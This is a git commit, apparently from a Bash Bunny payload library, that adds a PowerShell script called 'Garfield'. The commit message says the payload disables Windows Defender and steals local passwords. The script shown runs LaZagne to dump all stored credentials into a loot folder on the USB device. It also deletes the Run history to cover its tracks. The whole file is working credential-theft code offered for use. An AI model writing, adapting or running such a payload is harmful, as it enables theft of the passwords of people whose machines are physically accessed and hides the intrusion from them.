afb7799c2698343797f89d94f448d806304ba519
Mike Galvin <40495197+Digressive@users.noreply.github.com>
2019-10-21 15:39:08 +0100

    Disable Win Defender and grab local passwords
    This payload will disable Windows Defender and grab local passwords using LaZagne.

---
+++ payloads/library/credentials/Garfield/g.ps1
@@ -0,0 +1,14 @@
+﻿# Vars for log
+$destFile = ("$env:COMPUTERNAME-{0:yyyy-MM-dd-HH-mm-ss}.log" -f (Get-Date))
+$ToolPath = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'bin')
+$destPath = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\Garfield')
+$dest = "$destPath\$destFile"
+
+# Clear Run history
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -ErrorAction SilentlyContinue
+
+# Get passwords
+& $ToolPath\lazagne.exe all | Out-File -FilePath $dest -Encoding ASCII
+
+Add-Content -Path $dest -Value ""
+Add-Content -Path $dest -Value "Have a nice day ;)"
